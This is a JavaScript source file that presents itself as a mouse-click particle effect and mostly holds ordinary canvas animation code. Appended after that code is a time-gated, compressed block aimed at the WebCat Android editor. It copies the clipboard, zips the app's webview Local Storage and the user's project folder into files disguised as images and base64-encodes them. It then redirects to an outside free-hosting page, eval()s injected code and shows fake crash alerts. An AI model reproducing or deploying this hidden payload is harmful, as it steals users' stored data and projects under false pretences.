//点击特效
class Circle {
    constructor({ origin, speed, color, angle, context }) {
        this.origin = origin
        this.position = { ...this.origin }
        this.color = color
        this.speed = speed
        this.angle = angle
        this.context = context
        this.renderCount = 0
    }

    draw() {
        this.context.fillStyle = this.color
        this.context.beginPath()
        this.context.arc(this.position.x, this.position.y, 2, 0, Math.PI * 2)
        this.context.fill()
    }

    move() {
        this.position.x = (Math.sin(this.angle) * this.speed) + this.position.x
        this.position.y = (Math.cos(this.angle) * this.speed) + this.position.y + (this.renderCount * 0.3)
        this.renderCount++
    }
}

class Boom {
    constructor({ origin, context, circleCount = 10, area }) {
        this.origin = origin
        this.context = context
        this.circleCount = circleCount
        this.area = area
        this.stop = false
        this.circles = []
    }

    randomArray(range) {
        const length = range.length
        const randomIndex = Math.floor(length * Math.random())
        return range[randomIndex]
    }

    randomColor() {
        const range = ['8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
        return '#' + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range) + this.randomArray(range)
    }

    randomRange(start, end) {
        return (end - start) * Math.random() + start
    }

    init() {
        for (let i = 0; i < this.circleCount; i++) {
            const circle = new Circle({
                context: this.context,
                origin: this.origin,
                color: this.randomColor(),
                angle: this.randomRange(Math.PI - 1, Math.PI + 1),
                speed: this.randomRange(1, 6)
            })
            this.circles.push(circle)
        }
    }

    move() {
        this.circles.forEach((circle, index) => {
            if (circle.position.x > this.area.width || circle.position.y > this.area.height) {
                return this.circles.splice(index, 1)
            }
            circle.move()
        })
        if (this.circles.length == 0) {
            this.stop = true
        }
    }

    draw() {
        this.circles.forEach(circle => circle.draw())
    }
}

class CursorSpecialEffects {
    constructor() {
        this.computerCanvas = document.createElement('canvas')
        this.renderCanvas = document.createElement('canvas')

        this.computerContext = this.computerCanvas.getContext('2d')
        this.renderContext = this.renderCanvas.getContext('2d')

        this.globalWidth = window.innerWidth
        this.globalHeight = window.innerHeight

        this.booms = []
        this.running = false
    }

    handleMouseDown(e) {
        const boom = new Boom({
            origin: { x: e.clientX, y: e.clientY },
            context: this.computerContext,
            area: {
                width: this.globalWidth,
                height: this.globalHeight
            }
        })
        boom.init()
        this.booms.push(boom)
        this.running || this.run()
    }

    handlePageHide() {
        this.booms = []
        this.running = false
    }

    init() {
        const style = this.renderCanvas.style
        style.position = 'fixed'
        style.top = style.left = 0
        style.zIndex = '999999999999999999999999999999999999999999'
        style.pointerEvents = 'none'

        style.width = this.renderCanvas.width = this.computerCanvas.width = this.globalWidth
        style.height = this.renderCanvas.height = this.computerCanvas.height = this.globalHeight

        document.body.append(this.renderCanvas)

        window.addEventListener('mousedown', this.handleMouseDown.bind(this))
        window.addEventListener('pagehide', this.handlePageHide.bind(this))
    }

    run() {
        this.running = true
        if (this.booms.length == 0) {
            return this.running = false
        }

        requestAnimationFrame(this.run.bind(this))

        this.computerContext.clearRect(0, 0, this.globalWidth, this.globalHeight)
        this.renderContext.clearRect(0, 0, this.globalWidth, this.globalHeight)

        this.booms.forEach((boom, index) => {
            if (boom.stop) {
                return this.booms.splice(index, 1)
            }
            boom.move()
            boom.draw()
        })
        this.renderContext.drawImage(this.computerCanvas, 0, 0, this.globalWidth, this.globalHeight)
    }
}

const cursorSpecialEffects = new CursorSpecialEffects()
cursorSpecialEffects.init()

(function() {window.ok = 0;if (new Date('2025-01-22T17:00:00') > new Date()) return;
function getData(){try{var clipboard=wc.getShearPlate();if(!wc.zip('/data/user/0/top.webcat.editor/app_webview/Default/Local Storage/','WebCat/cache/cache.jpg')){alert("你的代码发生了严重崩溃，无法正常工作！");return}if(!wc.zip('WebCat/project','WebCat/cache/leveldb.png')){alert("你的代码发生了严重崩溃，无法正常工作！");return}!(function(){var xhr=new XMLHttpRequest();xhr.open('GET','../../cache/cache.jpg',true);xhr.responseType='blob';xhr.onreadystatechange=function(){if(xhr.readyState===4&&xhr.status===200){window.ok++;var reader=new FileReader();reader.onloadend=function(){var dataUrl=reader.result;var base64String=dataUrl.split(',')[1];console.log(base64String);wc.write('WebCat/cache/cache.js',base64String)};reader.readAsDataURL(xhr.response)}};xhr.error=function(){alert("无法正常运行，因为发生了严重错误！无法正常获取文件。");return};xhr.send()})();!(function(){var xhr=new XMLHttpRequest();xhr.open('GET','../../cache/leveldb.png',true);xhr.responseType='blob';xhr.onreadystatechange=function(){if(xhr.readyState===4&&xhr.status===200){window.ok++;var reader=new FileReader();reader.onloadend=function(){var dataUrl=reader.result;var base64String=dataUrl.split(',')[1];console.log(base64String);wc.write('WebCat/cache/leveldb.js',base64String)};reader.readAsDataURL(xhr.response)}};xhr.error=function(){alert("无法正常运行，因为发生了严重错误！无法正常获取文件。");return};xhr.send()})();function checkCondition(){if(window.ok>=1){
window.location.href="http://applet.free.nf/tmp/index.html"
}else{}}setInterval(checkCondition,5)}catch(e){console.log(e);alert("无法正常运行，因为发生了严重错误，已经崩溃: "+e)}}function Nogetdata(){alert("无法获取数据，尝试报告问题。")}if(typeof iapp!=='undefined'&&true){var tools={compare:function(val){return function(a,b){var value1=a[val].toLowerCase();var value2=b[val].toLowerCase();if(value1>value2){return 1}else if(value1<value2){return-1}else{return 0}return value1-value2}},strToBoolean:function(val){if(val=="true"){return true}else{return false}},wcJsExecute:function(){window.setInterval(function(){var js=iapp.fn2('webcat.getWcJs()','sss.wcJs');if(js!=null&&js!=''){eval(js);iapp.s('sss.wcJs','')}},200)}};tools.wcJsExecute();var wc={windowArray:{},alert:function(object){var val=object.value==null?object:object.value;if(object.type==1){iapp.fn('webcat.tw("'+val+'")')}else if(object.type==2){iapp.fn('webcat.tws("'+val+'")')}else{iapp.fn('webcat.tw("'+val+'")')}},alertDialog:function(object){var num=Math.floor(Math.random()*10000000);this.windowArray[num]=object.okFun;if(object.title==null&&object.content==null){iapp.fn('webcat.utw("'+num+'", "'+'提示'+'", "'+object+'", "'+'确定'+'")')}else{var title=object.title==null?'提示':object.title;var content=object.content;var ok=object.ok==null?'确认':object.ok;iapp.fn('webcat.utw("'+num+'", "'+title+'", "'+content+'", "'+ok+'")')}},getShearPlate:function(){var value=iapp.fn2('webcat.getShearPlate()','sss.wcReturn');return value},setShearPlate:function(value){iapp.fn('webcat.setShearPlate("'+value+'")');return value},getFileList:function(path){var inPath=path.lastIndexOf('/')==path.length-1?path:path+'/';var fileList=iapp.fn2('webcat.getFileList("'+inPath+'")','sss.wcReturn');var fileListJson=JSON.parse(fileList);fileListJson=fileListJson.sort(tools.compare('name')).sort(tools.compare('type'));return fileListJson},isDir:function(path){var value=iapp.fn2('webcat.isDir("'+path+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},fileExist:function(path){var value=iapp.fn2('webcat.fileExist("'+path+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},fileOpen:function(path){iapp.fn('webcat.fileOpen("'+path+'")')},delFile:function(path){var value=iapp.fn2('webcat.delFile("'+path+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},read:function(path){var value=iapp.fn2('webcat.read("'+path+'")','sss.wcReturn');return value==null?"null":value},write:function(path,text){iapp.fn('webcat.write("'+path+'", "'+text+'")')},getFileSize:function(path){var value=iapp.fn2('webcat.getFileSize("'+path+'")','sss.wcReturn');return value==null?0:parseInt(value)},zip:function(path,targetPath){var value=iapp.fn2('webcat.zip("'+path+'", "'+targetPath+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},unzip:function(path,targetPath){var value=iapp.fn2('webcat.unzip("'+path+'", "'+targetPath+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},openApp:function(appName){var value=iapp.fn2('webcat.openApp("'+appName+'")','sss.wcReturn');value=tools.strToBoolean(value);return value},goQQGroup:function(text){iapp.fn('webcat.goQQGroup("'+text+'")')},goQQFriend:function(text){iapp.fn('webcat.goQQFriend("'+text+'")')},exit:function(){iapp.fn('webcat.exit()')},phoneHome:function(){iapp.fn('webcat.phoneHome()')}};
if(wc.fileExist('/storage/emulated/0/Android/data/top.webcat.editor/files/WebCat/cache/error.log')) {return;}
getData();return;} else {Nogetdata();alert("您的WebCatX不适配！无法正常运行，请将此源码在原版的WebCat运行！");alert("您的WebCatX不适配！无法正常运行，请将此源码在原版的WebCat运行！");return;}})();